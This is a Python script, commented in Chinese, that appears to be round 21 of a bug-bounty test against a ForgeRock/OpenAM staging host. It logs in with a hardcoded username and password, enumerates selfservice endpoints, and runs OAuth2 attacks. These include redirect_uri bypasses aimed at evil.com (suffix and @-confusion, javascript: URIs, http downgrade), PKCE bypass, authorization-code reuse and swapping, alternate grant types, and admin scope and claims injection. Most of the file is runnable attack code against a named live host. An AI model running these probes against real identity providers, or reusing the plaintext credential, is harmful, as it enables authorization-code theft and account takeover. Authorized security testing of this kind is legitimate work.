# -*- coding: utf-8 -*-
"""AIC 第二十一轮:接口逻辑面——OAuth2 授权逻辑 + selfservice 端点定位
面:
  A. selfservice 真实端点(两种 realm 路径格式对比)
  B. authorize redirect_uri 校验绕过(开放重定向/授权码劫持前提)
  C. PKCE 缺失/错误时 authorize 与 token 行为(PKCE 绕过检测)
  D. 授权码重用/参数篡改(token 端点逻辑)
预期结果表:
  成立 -> redirect_uri 严格白名单;无 PKCE 的 code 无法换 token;code 一次性
  不成立(发现) -> 开放重定向 / PKCE 绕过 / code 重用
"""
import requests, urllib3, json, base64, hashlib, os
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录建会话
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
print('LOGIN OK:', tok[:40])

def probe(method, path, body=None, data=None, allow_redir=False, label=''):
    kw = {'timeout': 12, 'verify': False, 'allow_redirects': allow_redir}
    if body is not None:
        kw['json'] = body
    if data is not None:
        kw['data'] = data
    try:
        r = S.request(method, BASE + path, **kw)
        tag = ('  <= ' + label) if label else ''
        loc = r.headers.get('Location', '')
        extra = (' Loc=' + loc[:120]) if loc else ''
        print('%-5s %-75s -> %d  %s%s%s' % (method, path[:75], r.status_code, r.text[:140].replace('\n', ' '), extra, tag))
        return r
    except Exception as e:
        print('%-5s %-75s -> ERR %s' % (method, path[:75], str(e)[:60]))

print('\n=== A. selfservice 真实端点定位 ===')
for p in ['/am/json/realms/alpha/selfservice/kba',
          '/am/json/realms/root/realms/alpha/selfservice/kba',
          '/am/json/realms/alpha/selfservice/profile',
          '/am/json/realms/alpha/selfservice/userRegistration',
          '/am/json/realms/alpha/selfservice/passwordReset',
          '/am/json/realms/alpha/selfservice',
          '/am/json/realms/root/realms/alpha/selfservice',
          '/am/json/realms/alpha/selfservice/terms',
          '/am/json/realms/alpha/selfservice/forgottenUsername',
          '/am/json/realms/alpha/selfservice/socialUserClaim']:
    probe('GET', p)

print('\n=== B. authorize redirect_uri 校验 ===')
def authz(ru, extra='', label=''):
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&response_type=code&redirect_uri=%s&scope=openid&state=t%s' % (ru, extra))
    probe('GET', url, allow_redir=False, label=label)

authz(RU, '', '基线正确')
for ru, lab in [
    ('https://evil.com', '绝对外域'),
    ('http://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html', '降级 http'),
    ('https://openam-bug-bounty-stag.forgeblocks.com.evil.com/', '域名后缀混淆'),
    ('https://evil.com/enduser/sessionCheck.html', '外域同路径'),
    ('/enduser/sessionCheck.html', '相对路径'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html/', '尾斜杠'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html%23', 'fragment 注入'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html?x=1', 'query 附加'),
    ('https://openam-bug-bounty-stag.forgeblocks.com.evil.com', '子域混淆2'),
    ('https://openam-bug-bounty-stag.forgeblocks.com@evil.com', '@ 混淆'),
    ('javascript:alert(1)', 'javascript'),
    ('https://openam-bug-bounty-stag.forgeblocks.com', '主域无路径'),
]:
    authz(ru, '', lab)

print('\n=== C. PKCE 缺失/错误时 authorize 与 token ===')
# C1: 无 code_challenge 发 code
url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
       '&response_type=code&redirect_uri=%s&scope=openid&state=t' % RU)
r = S.get(url, timeout=12, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
print('C1 no-PKCE authorize:', r.status_code, loc[:200])
code_no_pkce = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
if code_no_pkce:
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code_no_pkce,
                     'redirect_uri': RU, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
    print('C1b no-PKCE code exchange:', r.status_code, r.text[:150])

# C2: 带 code_challenge 但换 token 时缺 code_verifier
ver = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
ch = base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b'=').decode()
url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
       '&response_type=code&redirect_uri=%s&scope=openid&state=t'
       '&code_challenge=%s&code_challenge_method=S256' % (RU, ch))
r = S.get(url, timeout=12, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
print('C2 authz with challenge:', r.status_code, loc[:160])
if code:
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code,
                     'redirect_uri': RU, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
    print('C2b no-verifier exchange:', r.status_code, r.text[:150])
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                     'client_id': 'endUserUIClient', 'code_verifier': 'wrong'}, timeout=12, verify=False)
    print('C2c wrong-verifier exchange:', r.status_code, r.text[:150])
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                     'client_id': 'endUserUIClient', 'code_verifier': ver}, timeout=12, verify=False)
    print('C2d correct exchange:', r.status_code, r.text[:150])
    # C3: code 重用(第二次用同一 code)
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                     'client_id': 'endUserUIClient', 'code_verifier': ver}, timeout=12, verify=False)
    print('C3 code reuse:', r.status_code, r.text[:150])
    # C4: 换 redirect_uri 交换
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code,
                     'redirect_uri': 'https://evil.com/', 'client_id': 'endUserUIClient',
                     'code_verifier': ver}, timeout=12, verify=False)
    print('C4 wrong-redirect exchange:', r.status_code, r.text[:150])
    # C5: 换 client_id 交换
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
               data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                     'client_id': 'otherClient', 'code_verifier': ver}, timeout=12, verify=False)
    print('C5 wrong-client exchange:', r.status_code, r.text[:150])

print('\n=== D. token 端点其他 grant_type ===')
for gt, extra in [('client_credentials', {'scope': 'openid'}),
                  ('password', {'username': 'pccp', 'password': PASS, 'scope': 'openid'}),
                  ('refresh_token', {}),
                  ('authorization_code', {'code': 'fake', 'redirect_uri': RU,
                                          'client_id': 'endUserUIClient', 'code_verifier': 'x'})]:
    d = {'grant_type': gt, 'client_id': 'endUserUIClient'}
    d.update(extra)
    r = S.post(BASE + '/am/oauth2/realms/alpha/access_token', data=d, timeout=12, verify=False)
    print('grant_type=%s -> %d %s' % (gt, r.status_code, r.text[:150].replace('\n', ' ')))

print('\n=== E. authorize 其他参数逻辑 ===')
for extra, lab in [
    ('&prompt=login', 'prompt=login'),
    ('&prompt=none', 'prompt=none(已登录)'),
    ('&response_mode=form_post', 'response_mode=form_post'),
    ('&response_type=token', 'implicit token'),
    ('&response_type=code+token', 'hybrid'),
    ('&max_age=0', 'max_age=0'),
    ('&nonce=x&response_type=id_token', 'id_token 流'),
    ('&scope=openid+admin', 'scope 注入 admin'),
    ('&claims=%7B%22id_token%22%3A%7B%22admin%22%3Anull%7D%7D', 'claims 注入'),
]:
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&redirect_uri=%s&scope=openid&state=t%s' % (RU, extra))
    probe('GET', url, allow_redir=False, label=lab)
